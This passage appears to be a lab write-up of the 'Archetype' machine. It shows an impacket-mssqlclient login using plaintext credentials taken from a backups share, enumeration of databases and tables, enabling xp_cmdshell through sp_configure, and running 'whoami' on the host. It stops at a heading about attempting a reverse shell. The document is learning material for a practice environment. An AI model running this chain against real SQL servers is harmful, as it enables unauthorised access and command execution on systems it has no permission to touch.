Using the credentials found in the backups share, the attacker can connect to the SQL server.

- https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
```
┌──(kali㉿kali)-[~]
└─$ impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.47.24 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)> 
```

### View available databases
```
┌──(kali㉿kali)-[~]
└─$ impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.251.138 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT name FROM sys.databases;
name     
------   
master   

tempdb   

model    

msdb  
```

### show table contents
```
SQL (ARCHETYPE\sql_svc  dbo@master)> USE master
ENVCHANGE(DATABASE): Old Value: master, New Value: master
INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT * FROM information_schema.tables;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME              TABLE_TYPE   
-------------   ------------   ---------------------   ----------   
master          dbo            spt_fallback_db         b'BASE TABLE'   

master          dbo            spt_fallback_dev        b'BASE TABLE'   

master          dbo            spt_fallback_usg        b'BASE TABLE'   

master          dbo            spt_values              b'VIEW'      

master          dbo            spt_monitor             b'BASE TABLE'   

master          dbo            MSreplication_options   b'BASE TABLE'  

SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT * FROM MSreplication_options
optname          value   major_version   minor_version   revision   install_failures   
--------------   -----   -------------   -------------   --------   ----------------   
transactional        1              90               0          0                  0   

merge                1              90               0          0                  0   

security_model       1              90               0          0                  0   
```



`tempdb` and `model` are both empty.

## xp_cmdshell

Microsoft SQL servers have a xp_cmdshell function that spawns a windows command shell, though it is disabled by default.
- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver17
- `xp_cmdshell { 'command_string' } [ , NO_OUTPUT ]`
```
## Remarks

The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account.

Caution

`xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using Policy-Based Management or by executing `sp_configure`. For more information, see [Surface area configuration](https://learn.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration?view=sql-server-ver17) and [xp_cmdshell (server configuration option)](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver17). Using `xp_cmdshell` can trigger security audit tools.
```

- Enabling xp_cmdshell:  https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver17

### Testing access to xp_cmdshell
```
SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC xp_cmdshell 'whoami';
ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.

```

```
SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC sp_configure 'show advanced options', 1;                                                                          
INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@msdb)> RECONFIGURE;
SQL (ARCHETYPE\sql_svc  dbo@msdb)> GO
ERROR(ARCHETYPE): Line 1: Could not find stored procedure 'GO'.
SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC sp_configure 'xp_cmdshell', 1;
INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@msdb)> RECONFIGURE;
SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC xp_cmdshell 'whoami';output              
-----------------   
archetype\sql_svc   

NULL   
```

## Attempting a reverse shell
- https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html
